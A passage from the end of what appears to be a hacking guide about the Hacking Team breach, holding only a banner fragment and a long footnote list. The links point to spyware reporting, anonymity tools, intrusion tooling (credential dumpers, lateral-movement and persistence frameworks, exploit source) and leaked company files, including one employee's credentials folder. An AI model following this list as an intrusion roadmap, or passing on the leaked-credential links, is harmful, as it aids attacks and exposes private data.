               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
```

---

[^1]: http://pastebin.com/raw.php?i=cRYvK4jb "pastebin.com"
[^2]: https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI "en.wikipedia.org"
[^3]: http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html "www.aljazeera.com"
[^4]: https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf "securelist.com"
[^5]: http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group "madrid.cnt.es"
[^6]: http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/ "www.animalpolitico.com"
[^7]: http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html "www.prensa.com"
[^8]: http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/ "www.24-horas.mx"
[^9]: https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/ "citizenlab.org"
[^10]: https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/ "citizenlab.org"
[^11]: https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/ "citizenlab.org"
[^12]: http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/ "focusecuador.net"
[^13]: http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal "www.pri.org"
[^14]: https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/ "theintercept.com"
[^15]: http://www.wired.com/2013/06/spy-tool-sold-to-governments/ "www.wired.com"
[^16]: http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/ "www.theregister.co.uk"
[^17]: http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html "www.ilmessaggero.it"
[^18]: http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web "motherboard.vice.com"
[^19]: https://www.torproject.org/ "www.torproject.org"
[^20]: https://info.securityinabox.org/es/chapter-4 "info.securityinabox.org"
[^21]: https://www.whonix.org/ "www.whonix.org"
[^22]: https://tails.boum.org/ "tails.boum.org"
[^23]: https://www.qubes-os.org/doc/privacy/torvm/ "www.qubes-os.org"
[^24]: https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy "trac.torproject.org"
[^25]: https://www.whonix.org/wiki/Comparison_with_Others "www.whonix.org"
[^26]: https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/ "blog.torproject.org"
[^27]: http://www.wifislax.com/ "www.wifislax.com"
[^28]: https://www.torproject.org/docs/bridges.html.en "www.torproject.org"
[^29]: http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html "www.documentcloud.org"
[^30]: http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html "www.nytimes.com"
[^31]: http://web.archive.org/web/20140610083726/%5B%5Bhttp://www.soulblack.com.ar/repo/papers/hackeando_con_google.pd "www.soulblack.com.ar"
[^32]: http://ha.ckers.org/fierce/ "ha.ckers.org"
[^33]: https://github.com/laramies/theHarvester "github.com"
[^34]: https://bitbucket.org/LaNMaSteR53/recon-ng "bitbucket.org"
[^35]: https://nmap.org/ "nmap.org"
[^36]: https://zmap.io/ "zmap.io"
[^37]: https://github.com/robertdavidgraham/masscan "github.com"
[^38]: http://www.morningstarsecurity.com/research/whatweb "www.morningstarsecurity.com"
[^39]: http://blindelephant.sourceforge.net/ "blindelephant.sourceforge.net"
[^40]: https://github.com/laramies/metagoofil "github.com"
[^41]: https://www.elevenpaths.com/es/labstools/foca-2/index.html "www.elevenpaths.com"
[^42]: http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html "www.hacknbytes.com"
[^43]: http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/ "blog.cobaltstrike.com"
[^44]: http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf "www.netcomunity.com"
[^45]: http://pastebin.com/raw.php?i=cRYvK4jb "pastebin.com"
[^60]: https://www.shodan.io/search?query=product%3Amongodb "www.shodan.io"
[^61]: https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql "community.rapid7.com"
[^62]: http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html "archives.neohapsis.com"
[^63]: http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c "downloads.securityfocus.com"
[^64]: http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html "archives.neohapsis.com"
[^65]: https://ht.transparencytoolkit.org/audio/ "ht.transparencytoolkit.org"
[^66]: https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf "ht.transparencytoolkit.org"
[^67]: https://github.com/Neohapsis/creddump7 "github.com"
[^68]: http://proxychains.sourceforge.net/ "proxychains.sourceforge.net"
[^69]: https://www.samba.org/ "www.samba.org"
[^70]: http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf "ns2.elhacker.net"
[^71]: https://github.com/gentilkiwi/mimikatz "github.com"
[^72]: http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/ "www.stevieg.org"
[^73]: https://adsecurity.org/?page_id=1821 "adsecurity.org"
[^74]: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp "github.com"
[^75]: https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1 "github.com"
[^76]: https://technet.microsoft.com/en-us/sysinternals/psexec.aspx "technet.microsoft.com"
[^77]: https://sourceforge.net/projects/winexe/ "sourceforge.net"
[^78]: https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh "www.rapid7.com"
[^79]: http://www.powershellempire.com/?page_id=523 "www.powershellempire.com"
[^80]: http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-cc/ "blog.cobaltstrike.com"
[^81]: https://github.com/byt3bl33d3r/pth-toolkit "github.com"
[^82]: https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py "github.com"
[^83]: https://www.trustedsec.com/june-2015/no_psexec_needed/ "www.trustedsec.com"
[^84]: http://www.powershellempire.com/?page_id=124 "www.powershellempire.com"
[^85]: http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/ "www.maquinasvirtuales.eu"
[^86]: https://adsecurity.org/?p=2277 "adsecurity.org"
[^87]: https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems "www.secureworks.com"
[^88]: https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py "github.com"
[^89]: https://www.indetectables.net/viewtopic.php?p=211165 "www.indetectables.net"
[^90]: https://adsecurity.org/?page_id=1821 "adsecurity.org"
[^91]: https://github.com/bidord/pykek "github.com"
[^92]: https://adsecurity.org/?p=676 "adsecurity.org"
[^93]: http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html "www.hackplayers.com"
[^94]: https://github.com/n1nj4sec/pupy "github.com"
[^95]: http://www.powershellempire.com/?page_id=273 "www.powershellempire.com"
[^96]: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1 "github.com"
[^97]: http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/ "blog.cobaltstrike.com"
[^98]: http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/ "www.harmj0y.net"
[^99]: http://www.hexacorn.com/blog/category/autostart-persistence/ "www.hexacorn.com"
[^100]: https://blog.netspi.com/tag/persistence/ "blog.netspi.com"
[^101]: https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView "github.com"
[^102]: http://www.harmj0y.net/blog/tag/powerview/ "www.harmj0y.net"
[^103]: http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/ "www.harmj0y.net"
[^104]: http://www.harmj0y.net/blog/redteaming/powerview-2-0/ "www.harmj0y.net"
[^105]: http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/ "www.harmj0y.net"
[^106]: http://www.slideshare.net/harmj0y/i-have-the-powerview "www.slideshare.net"
[^107]: https://adsecurity.org/?p=2535 "adsecurity.org"
[^108]: https://www.youtube.com/watch?v=rpwrKhgMd7E "www.youtube.com"
[^109]: https://github.com/mubix/netview "github.com"
[^110]: https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/ "blogs.msdn.microsoft.com"
[^111]: https://adsecurity.org/?page_id=41 "adsecurity.org"
[^112]: http://www.darkoperator.com/?tag=Active%2BDirectory "www.darkoperator.com"
[^113]: https://github.com/PowerShellMafia/PowerSploit "github.com"
[^114]: https://github.com/samratashok/nishang "github.com"
[^115]: http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/ "hacking.technology"
[^116]: http://www.hammer-software.com/wmigphowto.shtml "www.hammer-software.com"
[^117]: https://www.trustedsec.com/june-2015/no_psexec_needed/ "www.trustedsec.com"
[^118]: https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde "gallery.technet.microsoft.com"
[^119]: http://pwnwiki.io/#%21presence/windows/find_files.md "pwnwiki.io"
[^120]: http://archive.is/TbaPy "archive.is"
[^121]: http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/ "hacking.technology"
[^122]: http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt "hacking.technology"
[^123]: http://hacking.technology/Hacked%20Team/c.pozzi/credentials/ "hacking.technology"
[^124]: http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt "hacking.technology"
[^125]: http://seclists.org/fulldisclosure/2014/Oct/78 "seclists.org"
[^126]: https://twitter.com/coracurrier/status/618104723263090688 "twitter.com"
[^127]: http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/ "andres.delgado.ec"
[^128]: https://twitter.com/CthulhuSec/status/619459002854977537 "twitter.com"